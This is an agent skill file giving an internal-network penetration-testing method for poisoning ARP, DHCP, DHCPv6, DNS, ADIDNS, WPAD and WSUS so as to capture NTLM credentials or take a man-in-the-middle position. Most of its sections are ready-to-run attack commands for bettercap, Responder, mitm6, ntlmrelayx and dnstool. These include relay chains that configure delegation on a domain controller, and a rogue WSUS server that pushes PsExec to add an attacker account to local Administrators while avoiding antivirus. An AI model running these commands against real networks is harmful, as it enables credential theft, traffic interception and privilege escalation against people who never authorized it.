---
name: network-poisoning-attack
description: "Network-layer poisoning and protocol deception methodology for internal network penetration testing. Use when NTLM authentication must be captured through network poisoning or a man-in-the-middle position must be achieved. Covers ARP poisoning, DHCP poisoning, DHCPv6/mitm6 deception, DNS spoofing, ADIDNS record injection, WPAD hijacking, WSUS poisoning, ICMP redirect, and NBT Name Overwrite. Typically used as a prerequisite step for NTLM relay attacks."
zh-signals: "内网网络层投毒与协议欺骗（ARP、DHCP、DNS、WPAD、WSUS）获取 NTLM 认证。信号:arp投毒,dhcpv6,dns欺骗,mitm6,wpad,ntlm"
when-to-use: "Use when performing internal network poisoning to capture NTLM authentication or achieve man-in-the-middle, often as a prerequisite for NTLM relay."
metadata:
  tags: "arp poisoning,dhcp poisoning,dhcpv6,mitm6,dns spoofing,adidns,wpad,wsus,icmp redirect,nbt name overwrite,mitm,man-in-the-middle,poisoning,deception,bettercap,ettercap,dnstool,pywsus,responder,inveigh"
  category: "lateral"
---

# Network-Layer Poisoning and Deception Attacks

Poisoning network-layer protocols (ARP, DHCP, DNS, WPAD, etc.) to obtain a man-in-the-middle position or force authentication triggers is the most common prerequisite for NTLM relay attacks.

## Trigger Conditions

- The internal network requires poisoning to capture credentials or achieve man-in-the-middle
- Poisoning is needed as a prerequisite step for NTLM relay
- ARP/DHCP/DHCPv6/DNS/WPAD/WSUS poisoning is required

## Prerequisites

- Physical access on the same network segment (most techniques require the same broadcast domain)
- Domain user credentials (required for ADIDNS injection)
- Tools: bettercap, Responder, mitm6, dnstool.py, Inveigh, pywsus, dnschef

## Technology Selection Decision Tree

```
Network position and conditions?
├── Same broadcast domain
│   ├── Fast MITM → ARP poisoning (high detection risk)
│   ├── IPv6 not disabled → DHCPv6/mitm6 (recommended)
│   ├── DHCP environment → DHCP poisoning
│   └── Passive listening → LLMNR/NBT-NS (already covered → ntlm-relay-attack)
├── Domain environment + domain credentials
│   ├── ADIDNS record injection (most stable)
│   └── WPAD hijacking (combined with ADIDNS/DHCPv6)
├── WSUS uses HTTP
│   └── WSUS poisoning
└── DNS already controlled
    └── DNS spoofing
```

## Technology Comparison Table

| Poisoning Method | Prerequisites | Detection Risk | Applicable Scenario |
|----------|----------|----------|----------|
| ARP poisoning | Same broadcast domain | High (ARP anomalies) | Fast MITM requiring immediate effect |
| DHCP poisoning | Same broadcast domain | Medium | Persistent DNS/WPAD injection |
| DHCPv6/mitm6 | IPv6 not disabled | Low | Recommended, covert NTLM capture |
| DNS spoofing | DNS traffic already controlled | Low | Precise domain hijacking |
| ADIDNS injection | Domain credentials | Extremely low | Most stable, domain-level DNS poisoning |
| WPAD hijacking | See each sub-method | Medium | Transparent proxy authentication capture |
| WSUS poisoning | WSUS over HTTP | Medium | Code execution (not credential capture) |
| ICMP redirect | Same subnet | Low | Mostly ignored by modern OSes |

---

## 1. ARP Poisoning

### How It Works

The ARP protocol has no authentication mechanism. An attacker sends forged ARP responses to bind their own MAC address to the gateway or target IP, achieving traffic hijacking. This is split into bidirectional (fullduplex) and unidirectional poisoning.

### Core Commands

```bash
# bettercap interactive mode
bettercap -iface eth0

# Unidirectional poisoning (spoof only the target so its traffic passes through the attacker)
set arp.spoof.targets $CLIENT_IP
set arp.spoof.internal false
set arp.spoof.fullduplex false
arp.spoof on

# Bidirectional poisoning (spoof both the target and the gateway)
set arp.spoof.targets $CLIENT_IP
set arp.spoof.fullduplex true
arp.spoof on

# Enable IP forwarding (Linux)
sysctl -w net.ipv4.ip_forward=1
iptables --policy FORWARD ACCEPT
```

### SMB Scenario: Redirecting any.proxy to the Attacker's 445

```bash
# Redirect traffic from the target to $SERVER_IP:445 to the attacker
set any.proxy.src_address $SERVER_IP
set any.proxy.src_port 445
set any.proxy.dst_address $ATTACKER_IP
set any.proxy.dst_port 445
any.proxy on
```

### IP Spoofing Bypass (SNAT/DNAT)

```bash
# When the target checks the source IP, use iptables NAT to spoof it
iptables -t nat -A PREROUTING -p tcp -d $SERVER_IP --dport 445 -j DNAT --to-destination $ATTACKER_IP:445
iptables -t nat -A POSTROUTING -p tcp -s $CLIENT_IP --dport 445 -j SNAT --to-source $SERVER_IP
```

### Relay Handoff

After ARP poisoning establishes the MITM position, use any.proxy to redirect SMB/HTTP traffic to the ntlmrelayx listener port.

---

## 2. DHCP Poisoning

### How It Works

Responder's DHCP mode answers client DHCP requests and injects malicious DNS server or WPAD configuration. The effect lasts until the client DHCP lease expires or the client reboots.

### Core Commands

```bash
# DNS injection mode (inject DNS + WPAD)
responder -I "eth0" -wPdD

# WPAD injection only
responder -I "eth0" -wPd

# -d: inject DNS in DHCP responses
# -D: inject WPAD in DHCP responses
# -w: start the WPAD rogue proxy
# -P: force NTLM authentication (Proxy Auth)
```

### Relay Handoff

```bash
# WPAD injection + ntlmrelayx as the proxy
ntlmrelayx.py -t $TARGET --http-port 3128
# Responder points the WPAD configuration to $ATTACKER_IP:3128
```

---

## 3. DHCPv6/mitm6 (Recommended)

### How It Works

Windows enables IPv6 by default and prefers IPv6 DNS. mitm6 impersonates a DHCPv6 server to assign the target an IPv6 DNS server, pointing all DNS queries to the attacker. Stealth is high and IPv4 networks are unaffected.

### Core Commands

```bash
# Start mitm6
mitm6 --interface eth0 --domain $DOMAIN

# Specify the target (to limit the blast radius)
mitm6 --interface eth0 --domain $DOMAIN --host-allowlist $TARGET_HOSTNAME
```

### bettercap Alternative

```bash
set dhcp6.spoof.domains $DOMAIN
dhcp6.spoof on
set dns.spoof.domains *.$DOMAIN
dns.spoof on
```

### Relay Handoff

```bash
# Classic combo: mitm6 + ntlmrelayx
# Terminal 1
mitm6 -d $DOMAIN

# Terminal 2
ntlmrelayx.py -t ldaps://$DC -wh wpad.$DOMAIN --delegate-access
# -wh: set the WPAD hostname to trigger HTTP authentication
# --delegate-access: automatically configure RBCD
```

---

## 4. DNS Spoofing

### How It Works

After a MITM position has been obtained (ARP poisoning, etc.), intercept and tamper with DNS responses to resolve the target domain to the attacker IP. Traffic hijacking capability is required first.

### Core Commands

```bash
# dnschef (standalone DNS proxy)
dnschef --fakeip $ATTACKER_IP --interface $ATTACKER_IP --port 53

# Specify domains
dnschef --fakedomains $DOMAIN --fakeip $ATTACKER_IP --interface $ATTACKER_IP

# Built-in DNS in Responder
responder -I "eth0"

# bettercap dns.spoof
set dns.spoof.domains *.$DOMAIN
set dns.spoof.address $ATTACKER_IP
dns.spoof on
```

### Relay Handoff

DNS spoofing redirects the target's access to a specific service to the attacker, which then captures authentication requests in conjunction with ntlmrelayx.

---

## 5. ADIDNS Record Injection

### How It Works

Active Directory Integrated DNS (ADIDNS) allows any domain user to create new DNS child objects by default. By adding a wildcard record (*), all DNS queries that are not explicitly defined can be resolved to the attacker IP. This is the most stable poisoning method with the lowest detection risk.

### Core Commands

```bash
# Check for a WINS forward lookup (type 65281, which interferes with wildcards)
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '@' --action 'query' $DC

# Add the wildcard record
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP $DC

# Specify the DNS partition (--legacy for legacy DNS zones, --forest for forest level)
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP --legacy $DC

# Clean up (must be executed after the operation)
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action remove $DC
```

### Powermad Alternative

```powershell
# Add a wildcard A record
New-ADIDNSNode -Node * -Data $ATTACKER_IP
# Add a specific record
New-ADIDNSNode -Node wpad -Data $ATTACKER_IP
```

### Inveigh Automation

```powershell
# Automated ADIDNS injection + poisoning
Invoke-Inveigh -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3
# combo: wildcard + NS record combination
# ADIDNSThreshold: inject only after unresolved queries reach the threshold (reduces false positives)
```

### Relay Handoff

The wildcard record resolves all non-existent hostnames to the attacker, and Responder/ntlmrelayx automatically capture the authentication.

---

## 6. WPAD Hijacking

### How It Works

WPAD (Web Proxy Auto-Discovery) resolution chain: DHCP Option 252 → DNS query for wpad.$DOMAIN → LLMNR/NBT-NS broadcast. Hijacking any link in this chain makes the target proxy its traffic through the attacker, triggering NTLM authentication.

### Legacy Systems (without MS16-077)

```bash
# Respond to WPAD queries via LLMNR/NBT-NS
responder -I "eth0" -wP
# -w: WPAD rogue proxy
# -P: force Proxy NTLM authentication
```

### New Systems (GQBL bypass)

After MS16-077, WPAD is no longer resolved via broadcast and ADIDNS injection is required to bypass this:

```bash
# Method 1: add a wpad A record
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record 'wpad' --action add --data $ATTACKER_IP $DC

# Method 2: add an NS record delegation
```

```powershell
# PowerShell NS record (delegate the wpad subdomain to the attacker)
New-ADIDNSNode -Node wpad -Type NS -Data 'attacker.$DOMAIN'
# The attacker runs dnschef to answer wpad queries
```

### DHCPv6 Method

```bash
# When a wpad record already exists in DNS but points to the wrong place
mitm6 --domain $DOMAIN
# mitm6 uses DHCPv6 to make the target use the attacker DNS, directly controlling wpad resolution
```

### Relay Handoff

The WPAD proxy automatically triggers HTTP NTLM authentication, which is forwarded directly to ntlmrelayx.

---

## 7. WSUS Poisoning

### How It Works

If WSUS (Windows Server Update Services) uses HTTP instead of HTTPS, an attacker in an MITM position can replace update packages and achieve code execution. Note that this is code execution rather than credential capture.

### Checking WSUS Configuration

```bash
# Remote query (requires access rights)
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver
# If it starts with http:// → it can be poisoned
```

### Core Commands

```bash
# Start the malicious WSUS server
python3 pywsus.py --host $ATTACKER_IP --port 8530 \
  --executable /path/to/PsExec64.exe \
  --command '/accepteula /s cmd.exe /c "net localgroup Administrators $DOMAIN\\$USER /add"'
```

### bettercap Traffic Redirection

```bash
# Redirect WSUS traffic after ARP poisoning
set any.proxy.src_port 8530
set any.proxy.dst_address $ATTACKER_IP
set any.proxy.dst_port 8530
any.proxy on
```

### Additional Notes

- CVE-2020-1013: WSUS local privilege escalation vulnerability, exploitable locally
- Trigger an update check: `wuauclt /detectnow /updatenow` or `UsoClient StartScan`
- Prefer LOLBins (signed binaries such as PsExec64.exe) to avoid triggering AV

### Relay Handoff

WSUS poisoning is mainly used for code execution and does not hand off directly to NTLM relay.

---

## 8. ICMP Redirect

### How It Works

ICMP Redirect messages tell hosts about a better routing path. An attacker forges ICMP Redirect messages to redirect target traffic to itself. However, most modern OSes (Windows 10+, Linux by default) ignore ICMP Redirect.

### Core Commands

```bash
python3 tools/Icmp-Redirect.py \
  --interface eth0 \
  --ip $ATTACKER_IP \
  --gateway $GATEWAY \
  --target $TARGET \
  --route $DNS_SERVER
```

### Practical Value

Limited. Modern operating systems disable or ignore ICMP Redirect by default, and it only works in specific legacy environments.

---

## 9. NBT Name Overwrite

### How It Works

The NetBIOS name overwrite attack sends NetBIOS Name Overwrite packets to modify the target's name table, associating specific names with the attacker IP.

### Current State

Actual tool support is limited and it is mainly a theoretical reference. In real engagements, prefer more reliable methods such as ADIDNS or DHCPv6.

---

## Combined Exploitation Examples

### mitm6 + ntlmrelayx (Most Common)

```bash
# Terminal 1: DHCPv6 poisoning
mitm6 -d $DOMAIN

# Terminal 2: LDAP relay + RBCD
ntlmrelayx.py -t ldaps://$DC -wh wpad.$DOMAIN --delegate-access
```

### ADIDNS + Responder + relay

```bash
# Step 1: inject the wildcard DNS record
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP $DC

# Step 2: start Responder (SMB/HTTP disabled)
responder -I eth0

# Step 3: start ntlmrelayx
ntlmrelayx.py -t $TARGET -smb2support
```

---

## Further Reading

- → [references/layer2-poisoning.md](references/layer2-poisoning.md) — detailed commands and configuration for ARP/DHCP/DHCPv6/ICMP poisoning
- → [references/name-resolution-poisoning.md](references/name-resolution-poisoning.md) — complete attack chains for ADIDNS/WPAD/WSUS/DNS spoofing
